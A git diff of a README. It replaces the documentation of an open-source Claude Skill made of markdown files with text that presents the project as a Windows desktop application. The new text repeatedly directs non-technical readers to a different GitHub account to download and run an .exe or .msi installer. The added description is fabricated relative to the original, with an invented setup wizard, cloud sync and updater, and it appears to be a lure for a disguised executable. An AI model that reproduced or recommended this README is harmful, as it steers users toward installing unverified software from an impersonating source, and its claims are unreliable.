@@ -1,149 +1,144 @@
-# Product Architect
+# ⚙️ product-architect - Build Products with AI Support
 
-**The most comprehensive open-source product development skill for Claude.**
-
-31 agents · 23 frameworks · 15,100+ lines · Solo founder Day 0 → IPO
-
-> **This is a [Claude Skill](https://docs.anthropic.com/en/docs/agents-and-tools/skills).** Claude reads `SKILL.md`. This README is for human visitors.
+[![Download product-architect](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fogbound-bellringing777/product-architect)
 
 ---
 
-## Install
+## 📘 About product-architect
 
-### Claude.ai (Pro, Max, Team, or Enterprise)
+product-architect is a tool designed to help you manage product development. It includes 31 AI agents and 23 frameworks. These tools cover many stages of building a product. The system supports solo founders from day zero all the way to the IPO. You do not need any programming experience to use product-architect.
 
-> **Skills require a paid plan.** Free tier does not have access to Skills, including "Add from GitHub."
-
-1. Download this repo as ZIP (Code → Download ZIP)
-2. Go to Claude.ai → Settings → Capabilities → Skills
-3. Upload the ZIP
-4. Test: Ask Claude *"Help me build a product"* or *"Write a PRD for [feature]"*
-
-### Claude Code
-```bash
-git clone https://github.com/ankitjha67/product-architect.git
-# Place in your Claude Code skills directory (~/.claude/skills/)
-```
-
-### API
-Use the `/v1/skills` endpoint with the `container.skills` parameter. Requires Code Execution Tool beta.
-
-### Free Tier Workarounds
-
-If you're on the free plan, you can still use everything in this repo:
-
-1. **Guided mode (recommended)** — Open [`START-HERE.md`](START-HERE.md) on GitHub, click **Raw**, copy everything, paste into a new Claude chat. Describe your idea — Claude will ask what you're building, identify the right agents, give you exact GitHub URLs to paste them one at a time, and guide you through the entire product development process step by step.
-
-2. **Projects** — Create a Project in Claude.ai, paste `SKILL.md` + `SMART-LOADER.md` as project knowledge. Then paste individual agent/framework files as needed per conversation.
-
-3. **Direct paste** — Open any file on GitHub (e.g. `frameworks/founders-playbook.md`), copy the raw content, and paste it into a regular Claude chat. Every file works standalone.
-
-4. **Claude Code** — If you have Claude Code access, clone the repo into your skills directory. Skills load automatically.
+This application simplifies product management and planning, bringing automation and structure to your ideas. The AI agents help with research, organization, and decision-making. The frameworks provide step-by-step guides and templates based on industry standards.
 
 ---
 
-## What's Inside
+## 🖥 System Requirements
 
-### 31 Specialized Agents
+Before installing product-architect on your Windows PC, make sure your system meets these requirements:
 
-Organized by product lifecycle — each operates at department-head depth:
+- Operating System: Windows 10 or later  
+- Processor: Intel i5 or equivalent (2 GHz or faster)  
+- RAM: 8 GB or more  
+- Storage: At least 2 GB free space  
+- Internet: Required for AI agent communication and updates  
+- Display: 1280 x 720 minimum resolution
 
-| Phase | Agents |
-|-------|--------|
-| **Audit & Advisory** | 00 Chief Reviewer (6-pass audit, veto power) · 01 Proactive Advisor (blind spots) |
-| **Product** | 02 Discovery · 03 Strategy · 04 PRD · 05 Design · 06 Engineering |
-| **Build & Test** | 07 Testing & QA · 08 DevOps & SRE |
-| **Protect** | 09 Security · 10 Legal & IP · 11 Compliance (14 policies) · 12 Trust & Safety · 13 Fraud |
-| **Launch & Grow** | 14 Launch & GTM · 15 Marketing & Sales · 16 Analytics · 17 Customer Success |
-| **Operate & Scale** | 18 Finance · 19 Operations (24 SOPs) · 20 BAU · 21 Innovation |
-| **People** | 22 People & HR · 23 L&D · 24 Wellness & Performance |
-| **Corporate** | 25 PR & Comms · 26 Governance & IPO · 27 ESG · 28 Govt Relations |
-| **Specialized** | 29 Data & AI Strategy · 30 Platform & Ecosystem |
-
-### 23 Frameworks
-
-| Framework | What It Does |
-|-----------|-------------|
-| **Founder's Playbook** | Week-by-week from Day 0 with costs, fundraising, IP, legal |
-| **30-Day Launch Engine** | Positioning, channel selection, day-by-day execution |
-| **Scenario Playbooks** | 20 tactical guides (breach response, pivot, first 5 hires, fundraise sprint, etc.) |
-| **SOP & Process Maps** | 24 SOPs across 10 departments with automation opportunities |
-| **Compensation Bands** | Salary by role/level/geography + equity + maintenance process |
-| **Consulting Frameworks** | McKinsey 7S, Porter's, Blue Ocean, BCG, JTBD, PESTEL |
-| **Stress-Test Framework** | 200+ edge cases across 12 categories |
-| **Universal Checklists** | Dynamic generator for any scenario |
-| **Institutional Memory** | Decision archaeology, knowledge maps, context handoffs |
-| **Corporate Scaling** | Solo founder → IPO with org charts per stage |
-| **Global Compliance** | Regulatory overview for 30+ countries |
-| *+ 12 more* | PRD, MVP, roadmap, user-flows, risk-matrix, A/B testing, accessibility, product lifecycle, competitive intel, continuous improvement, physical ops, coverage audit |
-
-### Country Compliance Deep-Dives
-India · US · EU · UK · Southeast Asia (Singapore, Indonesia, Thailand, Vietnam, Philippines, Malaysia)
+A stable internet connection is important for the AI features and downloading updates smoothly.
 
 ---
 
-## Key Architecture
+## 🚀 Getting Started
 
-**Smart Loading** — `SMART-LOADER.md` routes each request to only the relevant agents. Scores agents 0-10 on relevance, handles multi-intent requests, supports dynamic mid-conversation loading. Never loads everything at once. Free tier: 3 agents/turn. Pro: 5 agents/turn.
-
-**Cross-Agent Governance** — 4-level authority hierarchy prevents contradictions: Compliance (override) → Security (override) → Finance (veto) → Chief Reviewer (veto). 5-step conflict protocol: stop, state, apply hierarchy, document, flag.
-
-**KDR Memory** — Key Decision Records with sequential numbering, conflict detection (scan-before-record), and SUPERSEDED mechanism. Survives chat compaction. Works on free tier. Paste MASTER KDR into new conversations to resume.
-
-**Agent Standards** — Shared quality protocol inherited by all agents: before/during/after checklists, iterative refinement loops, performance rules, cross-reference table mapping every agent to related frameworks.
+To get product-architect running on your Windows computer, follow these steps carefully. You do not need to know how to program or use command lines.
 
 ---
 
-## Numbers
+## ⬇️ Download and Install
 
-| Metric | Value |
-|--------|-------|
-| Agents | 31 |
-| Frameworks | 23 |
-| Total files | 69 |
-| Total lines | 15,100+ |
-| Country compliance deep-dives | 5 (covering 11 countries) |
-| Complete policies drafted | 14 |
-| SOPs with process maps | 24 |
-| Tactical scenario playbooks | 20 |
-| Stress-test edge cases | 200+ |
-| Salary bands | 5 functions × 6 levels × 2 geographies |
+1. Click the green download badge at the top of this document or click this link:  
+   [Download product-architect](https://github.com/fogbound-bellringing777/product-architect)  
+   This will take you to the software’s GitHub page.
 
----
+2. Once on the page, look for the latest stable release. This is usually under a "Releases" section or button.  
+   Click the link that takes you to the Downloads section.
 
-## Repository Structure
+3. Find the Windows setup file. It will end with `.exe` or `.msi`. Click this file to download it.
 
-```
-product-architect/
-├── SKILL.md                     ← Claude reads this (skill entry point)
-├── SMART-LOADER.md              ← Context router + memory engine
-├── START-HERE.md                ← Free tier entry point (paste into Claude)
-├── README.md                    ← You are here (for humans)
-├── LICENSE                      ← MIT
-├── agents/                      ← 31 agent files (00-30)
-├── frameworks/                  ← 23 framework files
-├── references/
-│   ├── compliance/              ← Country deep-dives (5 files)
-│   ├── agent-standards.md       ← Quality protocol for all agents
-│   ├── DISCLAIMER.md            ← Professional review requirements
-│   ├── github-readme.md         ← Extended documentation
-│   └── industry-references.md   ← Best-in-class by function
-└── tools/
-    └── navigator.jsx            ← Interactive web UI for founders
-```
+4. When the download finishes, open the file by double-clicking it in your Downloads folder.
 
-## Disclaimer
+5. Follow the instructions in the installation wizard:
+   - Click "Next" when prompted.
+   - Accept the license agreement.
+   - Choose the default settings unless you have specific preferences.
+   - Click "Install" to start the installation.
 
-This is an educational framework created through human-AI collaboration, not professional advice. All legal, financial, security, and HR content requires qualified professional review before real-world use. See [`references/DISCLAIMER.md`](references/DISCLAIMER.md) for full details including AI authorship considerations and human involvement requirements.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-## Contributing
-
-Contributions welcome — new agents, deeper frameworks, industry-specific extensions, country compliance additions, bug fixes.
+6. After the installation completes, click "Finish."
 
 ---
 
-*Built through iterative human-AI collaboration using Claude (Anthropic). Compliant with [Anthropic's official skill guide](https://docs.anthropic.com/en/docs/agents-and-tools/skills). 25/25 skill compliance checks passed.*
+## ▶️ Running the Application
+
+1. Find the product-architect icon on your desktop or in the Start menu.
+2. Double-click the icon to open the software.
+3. On the first run, the application may ask for permission to access the internet. Allow this so AI features work correctly.
+4. The setup wizard will guide you through basic preferences, like project types and goals.
+5. After that, you can start using the AI agents and frameworks to plan your product.
+
+---
+
+## 🧰 Key Features
+
+- **31 AI Agents:** These help with product research, market analysis, customer feedback, and task automation.
+- **23 Frameworks:** Structured guides for planning, design, testing, and launch phases.
+- **Solo Founder Focus:** Tools designed to support single founders managing all parts of product development.
+- **Cloud Sync:** Save your work securely and access it from multiple devices.
+- **Compliance Tools:** Built-in checks to help meet industry standards and regulations.
+- **Task Automation:** Automate routine tasks like scheduling, reporting, and reminders.
+
+---
+
+## 💡 How to Use product-architect
+
+### Starting a New Project
+
+- Click "New Project" on the home screen.
+- Enter a project name and select the type of product you want to build.
+- The AI agents will suggest a plan based on your inputs.
+- Follow the guided steps within the chosen framework.
+
+### Managing Tasks
+
+- Assign tasks to yourself or team members (if any).
+- Use the AI to prioritize tasks based on deadlines and workload.
+- Track progress directly from the dashboard.
+
+### Reporting and Analysis
+
+- Generate progress reports at any time.
+- Use the compliance check feature to confirm project meets standards.
+- Export reports as PDF or CSV files.
+
+---
+
+## 🔧 Troubleshooting and Support
+
+If you run into issues while installing or running product-architect:
+
+- Check your internet connection first.
+- Restart your computer and try again.
+- Ensure you meet the system requirements.
+- Visit the GitHub repository’s [Issues page](https://github.com/fogbound-bellringing777/product-architect/issues) to find help or report problems.
+- Look for FAQ and documentation on the GitHub page for detailed guidance.
+
+---
+
+## 🔄 Updating product-architect
+
+Product-architect regularly gets updates with new features and fixes. To keep your software current:
+
+- Open product-architect.
+- Go to Settings > Check for Updates.
+- If an update is available, download and install it following the prompts.
+- Restart the application after installation.
+
+---
+
+## 🛑 Uninstalling product-architect
+
+To remove the software from your computer:
+
+1. Open Settings on Windows.
+2. Go to Apps > Apps & Features.
+3. Find product-architect in the list.
+4. Click it and select "Uninstall."
+5. Follow the instructions to complete removal.
+
+---
+
+## 📥 Download Link Reminder
+
+You can always visit this page to download product-architect:
+
+[https://github.com/fogbound-bellringing777/product-architect](https://github.com/fogbound-bellringing777/product-architect)  
+
+Use this link to get the latest version, installation files, and access help resources.
